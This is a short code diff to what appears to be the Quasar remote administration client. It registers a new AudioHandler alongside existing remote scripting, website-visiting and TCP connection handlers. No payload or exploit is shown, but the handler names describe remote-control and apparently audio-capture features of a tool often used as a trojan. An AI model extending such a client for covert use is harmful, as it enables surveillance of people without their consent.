@@ -200,6 +200,7 @@ namespace Quasar.Client
             _messageProcessors.Add(new TcpConnectionsHandler());
             _messageProcessors.Add(new WebsiteVisitorHandler());
             _messageProcessors.Add(new RemoteScriptingHandler());
+            _messageProcessors.Add(new AudioHandler());
 
             foreach (var msgProc in _messageProcessors)
             {
